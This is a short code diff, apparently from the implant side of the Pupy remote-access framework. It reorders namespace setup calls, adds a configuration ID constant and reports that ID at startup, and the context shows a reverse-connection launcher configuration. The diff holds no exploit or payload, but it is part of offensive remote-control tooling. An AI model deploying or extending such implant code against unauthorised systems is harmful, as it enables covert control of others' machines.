@@ -437,12 +437,6 @@ class Manager(object):
 
             self.pstore.store()
 
-setattr(pupy, 'manager', Manager(PStore()))
-setattr(pupy, 'Task', Task)
-setattr(pupy, 'connected', False)
-setattr(sys, 'terminated', False)
-setattr(sys, 'terminate', None)
-
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
 
@@ -464,8 +458,7 @@ def safe_obtain(proxy):
     ) # should prevent any code execution
 
 debug = False
-
-setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
+CONFIGURATION_CID = 31337
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
@@ -484,6 +477,15 @@ REVERSE_SLAVE_CONF = dict(
     instantiate_custom_exceptions=True,
     instantiate_oldstyle_exceptions=True,
 )
+
+setattr(sys, 'terminated', False)
+setattr(sys, 'terminate', None)
+
+setattr(pupy, 'manager', Manager(PStore()))
+setattr(pupy, 'Task', Task)
+setattr(pupy, 'connected', False)
+setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
+setattr(pupy, 'cid', CONFIGURATION_CID)
 
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = ['__invalidate__']
@@ -775,6 +777,7 @@ def main():
     pupy.infos['debug'] = debug
     pupy.infos['native'] = pupy.pseudo == False
     pupy.infos['revision'] = getattr(pupy, 'revision', None)
+    pupy.infos['cid'] = CONFIGURATION_CID
 
     logger.debug('Starting rpyc loop')
 
